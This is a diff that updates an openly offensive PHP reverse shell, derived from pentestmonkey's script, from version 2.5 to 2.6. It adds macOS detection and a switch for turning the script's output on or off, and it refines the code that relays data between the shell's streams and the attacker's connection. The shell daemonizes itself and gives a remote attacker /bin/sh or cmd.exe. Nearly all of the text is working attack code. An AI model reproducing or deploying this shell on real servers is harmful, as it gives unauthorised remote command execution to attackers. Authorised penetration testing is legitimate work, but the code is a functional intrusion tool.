@@ -1,6 +1,6 @@
 <?php
 // Copyright (c) 2020 Ivan Šincek
-// v2.5
+// v2.6
 // Requires PHP v4.3.0 or greater.
 // Works on Linux OS, macOS, and Windows OS.
 // See the original script at https://github.com/pentestmonkey/php-reverse-shell.
@@ -14,19 +14,21 @@ class Shell {
         1 => array('pipe', 'w'), // shell can write to STDOUT
         2 => array('pipe', 'w')  // shell can write to STDERR
     );
-    var $buffer  = 1024;    // read/write buffer size
-    var $clen    = 0;       // command length
-    var $error   = false;   // stream read/write error
+    var $buffer = 1024;  // read/write buffer size
+    var $clen   = 0;     // command length
+    var $error  = false; // stream read/write error
+    var $sdump  = true;  // script's dump
     function Shell($addr, $port) {
         $this->addr = $addr;
         $this->port = $port;
     }
     function detect() {
         $detected = true;
-        if (strpos(strtoupper(PHP_OS), 'LINUX') !== false) { // same for macOS
+        $os = strtoupper(PHP_OS);
+        if (strpos($os, 'LINUX') !== false || strpos($os, 'DARWIN') !== false) {
             $this->os    = 'LINUX';
             $this->shell = '/bin/sh';
-        } else if (strpos(strtoupper(PHP_OS), 'WIN32') !== false || strpos(strtoupper(PHP_OS), 'WINNT') !== false || strpos(strtoupper(PHP_OS), 'WINDOWS') !== false) {
+        } else if (strpos($os, 'WINDOWS') !== false || strpos($os, 'WINNT') !== false || strpos($os, 'WIN32') !== false) {
             $this->os    = 'WINDOWS';
             $this->shell = 'cmd.exe';
         } else {
@@ -44,8 +46,8 @@ class Shell {
         } else if ($pid > 0) {
             $exit = true;
             echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
+            // once daemonized, you will actually no longer see the script's dump
         } else if (posix_setsid() < 0) {
-            // once daemonized you will actually no longer see the script's dump
             echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
         } else {
             echo "DAEMONIZE: Completed successfully!\n";
@@ -58,20 +60,22 @@ class Shell {
         @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
     }
     function dump($data) {
-        $data = str_replace('<', '&lt;', $data);
-        $data = str_replace('>', '&gt;', $data);
-        echo $data;
+        if ($this->sdump) {
+            $data = str_replace('<', '&lt;', $data);
+            $data = str_replace('>', '&gt;', $data);
+            echo $data;
+        }
     }
     function read($stream, $name, $buffer) {
         if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
-            $this->error = true;                            // set global error flag
+            $this->error = true;                            // set the global error flag
             echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
         }
         return $data;
     }
     function write($stream, $name, $data) {
         if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
-            $this->error = true;                            // set global error flag
+            $this->error = true;                            // set the global error flag
             echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
         }
         return $bytes;
@@ -86,12 +90,11 @@ class Shell {
     // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
     // we must read the exact byte length from a stream and not a single byte more
     function brw($input, $output, $iname, $oname) {
-        $fstat = fstat($input);
-        $size = $fstat['size'];
+        $size = fstat($input)['size'];
         if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
             // for some reason Windows OS pipes STDIN into STDOUT
             // we do not like that
-            // we need to discard the data from the stream
+            // so we need to discard the data from the stream
             while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                 $this->clen -= $bytes;
                 $size -= $bytes;
